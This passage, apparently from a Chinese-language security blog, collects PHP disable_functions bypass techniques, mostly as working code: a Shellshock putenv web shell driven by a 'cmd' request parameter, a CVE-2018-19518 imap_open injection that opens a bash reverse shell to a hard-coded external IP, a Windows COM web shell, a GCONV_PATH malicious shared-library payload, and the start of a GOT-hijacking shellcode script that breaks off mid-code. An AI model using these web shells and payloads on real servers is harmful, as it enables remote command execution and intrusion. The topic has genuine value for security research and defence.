invoke__">function_exists</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>) || <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;mail&#x27;</span>)))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">readlink</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>), <span class="hljs-string">&quot;bash&quot;</span>)!=<span class="hljs-literal">FALSE</span>)&#123;<br>      <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-title function_ invoke__">sys_get_temp_dir</span>(), <span class="hljs-string">&#x27;as&#x27;</span>);<br>      <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$c</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">1</span>);<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@127.0.0.1&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-bv&quot;</span>);<br>      &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Not vuln (not bash)\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No output, or not vuln.&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;不满足使用条件&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// runcmd(&quot;whoami&quot;); // 要执行的命令</span><br><span class="hljs-title function_ invoke__">runcmd</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-comment">// ?cmd=whoami</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="imap-open-绕过-CVE-2018-19518"><a href="#imap-open-绕过-CVE-2018-19518" class="headerlink" title="imap_open()绕过 (CVE-2018-19518)"></a>imap_open()绕过 (CVE-2018-19518)</h1><p><strong>利用条件</strong></p><ul><li>PHP 安装 imap 模块</li></ul><p><strong>原理</strong></p><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）</p><p>ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。<br>即使是ssh连接失败了，但是命令还是能执行。</p><p><strong>利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;</span>;<br><span class="hljs-variable">$base64</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;any -oProxyCommand=echo\t<span class="hljs-subst">&#123;$base64&#125;</span>|base64\t-d|bash&quot;</span>;<br>@<span class="hljs-title function_ invoke__">imap_open</span>(<span class="hljs-string">&quot;&#123;&quot;</span>.<span class="hljs-variable">$server</span>.<span class="hljs-string">&quot;&#125;:143/imap&#125;INBOX&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;\n\nError: &quot;</span>.<span class="hljs-title function_ invoke__">imap_last_error</span>());;<br></code></pre></td></tr></table></figure><h1 id="Windows组件COM绕过"><a href="#Windows组件COM绕过" class="headerlink" title="Windows组件COM绕过"></a>Windows组件COM绕过</h1><p><strong>利用条件</strong></p><ul><li>com.allow_dcom &#x3D; true</li><li>extension&#x3D;php_com_dotnet.dll</li><li>php&gt;5.4</li><li>目标服务器为Windows系统</li></ul><p><strong>利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();<br>    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">ShellExecute</span>(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>putenv</li><li>iconv</li><li>存在可写的目录, 需要上传 .so 文件</li></ul><p><strong>原理</strong></p><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()</p><p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中</p><p>iconv_open函数的执行过程：<br>1：iconv_open函数首先会找到系统提供的gconv-modules文件，查看各个字符集的.so文件所在位置<br>2：然后再根据gconv-modules文件的指示去链接参数对应的.so文件<br>3：之后会调用.so文件中的gconv()与gonv_init()函数</p><p>使用的时候在编码转换时指定设置好的xxx编码，就会去调用指定的so文件了</p><p><strong>利用</strong></p><p>gconv-modules</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">module  PAYLOAD<span class="hljs-regexp">//</span>    INTERNAL    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/payload    <span class="hljs-number">2</span><br>module  INTERNAL    PAYLOAD<span class="hljs-regexp">//</span>    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/payload    <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>payload.c</p><p><code>gcc payload.c -o payload.so -shared -fPIC</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv</span><span class="hljs-params">()</span> &#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;pwned&quot;</span>);<br>  system(<span class="hljs-string">&quot;ls / &gt; /tmp/1.txt&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);<br>    <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br><br>    <span class="hljs-comment">// 其他调用了iconv_open()的函数也可以触发rce</span><br>    <span class="hljs-comment">// iconv_strlen(&quot;1&quot;,&quot;payload&quot;);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件</p></blockquote><p>将 gconv-modules 和编译好的 payload.so 传入tmp后执行1.php即可</p><h1 id="写shellcode劫持got表"><a href="#写shellcode劫持got表" class="headerlink" title="写shellcode劫持got表"></a>写shellcode劫持got表</h1><p><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">深入了解GOT,PLT和动态链接</a></p><p>劫持got表的思路</p><ul><li>读 &#x2F;proc&#x2F;self&#x2F;maps 和 &#x2F;proc&#x2F;self&#x2F;exe ，分别找到程序基地址，栈地址，libc地址和利用函数(open)的got表地址</li><li>写 &#x2F;proc&#x2F;self&#x2F;mem ，修改利用函数(open)的got表地址为存放shellcode的地址</li><li>构造shellcode并写入</li><li>通过例如readfile等可以调用open函数的函数来触发shellcode</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/***</span><br><span class="hljs-comment">https://xz.aliyun.com/t/7990</span><br><span class="hljs-comment">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504</span><br><span class="hljs-comment">***/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">section tables type</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NULL&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_PROGBITS&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SYMTAB&#x27;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_STRTAB&#x27;</span>,<span class="hljs-number">3</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_RELA&#x27;</span>,<span class="hljs-number">4</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_HASH&#x27;</span>,<span class="hljs-number">5</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DYNAMIC&#x27;</span>,<span class="hljs-number">6</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOTE&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_NOBITS&#x27;</span>,<span class="hljs-number">8</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_REL&#x27;</span>,<span class="hljs-number">9</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_SHLIB&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_DNYSYM&#x27;</span>,<span class="hljs-number">11</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_INIT_ARRAY&#x27;</span>,<span class="hljs-number">14</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_FINI_ARRAY&#x27;</span>,<span class="hljs-number">15</span>);<br><span class="hljs-comment">//why does section tables have so many fuck type</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_HASH&#x27;</span>,<span class="hljs-number">0x6ffffff6</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_versym&#x27;</span>,<span class="hljs-number">0x6fffffff</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SHT_GNU_verneed&#x27;</span>,<span class="hljs-number">0x6ffffffe</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">elf</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$elf_bin</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$strtab_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rel_plt_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElfBin</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;elf_bin;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElfBin</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_bin = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$elf_bin</span>,<span class="hljs-string">&quot;rb&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unp</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$value</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>&#123;<br><br>        <span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$start</span>);<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">fread</span> (<span class="hljs-variable">$this</span>-&gt;elf_bin,<span class="hljs-variable">$len</span>);<br>        <span class="hljs-title function_ invoke__">rewind</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">unp</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_section</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shoff=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x28</span>,<span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shentsize=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shnum=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3c</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;elf_shstrndx=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3e</span>,<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable language_">$this</span>-&gt;elf_shnum;<span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-variable">$sh_type</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$sh_type</span>)&#123;<br>                <span class="hljs-keyword">case</span> SHT_STRTAB:<br>                    <span class="hljs-variable language_">$this</span>-&gt;strtab_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;strtab_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;strtab_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">case</span> SHT_RELA:<br>                    <span class="hljs-variable language_">$this</span>-&gt;rel_plt_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;rel_plt_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> SHT_DNYSYM:<br>                    <span class="hljs-variable language_">$this</span>-&gt;dynsym_section[<span class="hljs-variable">$i</span>]=<br>                        <span class="hljs-keyword">array</span>(<br>                            <span class="hljs-string">&#x27;dynsym_offset&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;dynsym_size&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),<br>                            <span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)<br>                        );<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">case</span> SHT_NULL:<br>                <span class="hljs-keyword">case</span> SHT_PROGBITS:<br>                <span class="hljs-keyword">case</span> SHT_DYNAMIC:<br>            